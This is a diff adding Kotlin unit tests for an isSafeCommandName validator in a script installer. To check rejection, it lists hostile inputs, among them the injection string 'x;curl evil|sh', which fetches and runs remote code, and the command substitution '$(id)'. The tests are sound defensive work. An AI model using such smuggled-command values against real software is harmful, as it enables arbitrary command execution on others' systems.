@@ -1,6 +1,8 @@
 package com.hereliesaz.hg2gui.azp
 
 import org.junit.Assert.assertEquals
+import org.junit.Assert.assertFalse
+import org.junit.Assert.assertTrue
 import org.junit.Test
 
 /**
@@ -43,5 +45,24 @@ class ScriptInstallerTest {
         // The whole point of quoting: a value with spaces or shell metacharacters must survive
         // as one literal argument, not be re-split or glob-expanded by the wrapper's shell.
         assertEquals("'--flag *.txt'", "--flag *.txt".shellQuoted())
+    }
+
+    @Test
+    fun isSafeCommandName_acceptsPlainNames() {
+        assertTrue(isSafeCommandName("git-sync"))
+        assertTrue(isSafeCommandName("tool_v1.2"))
+        assertTrue(isSafeCommandName(".hidden"))
+    }
+
+    @Test
+    fun isSafeCommandName_rejectsInjectionAndPaths() {
+        assertFalse(isSafeCommandName("-rf"))
+        assertFalse(isSafeCommandName("a/b"))
+        assertFalse(isSafeCommandName("x;curl evil|sh"))
+        assertFalse(isSafeCommandName("a b"))
+        assertFalse(isSafeCommandName("$(id)"))
+        assertFalse(isSafeCommandName(""))
+        assertFalse(isSafeCommandName(".."))
+        assertFalse(isSafeCommandName("a".repeat(65)))
     }
 }
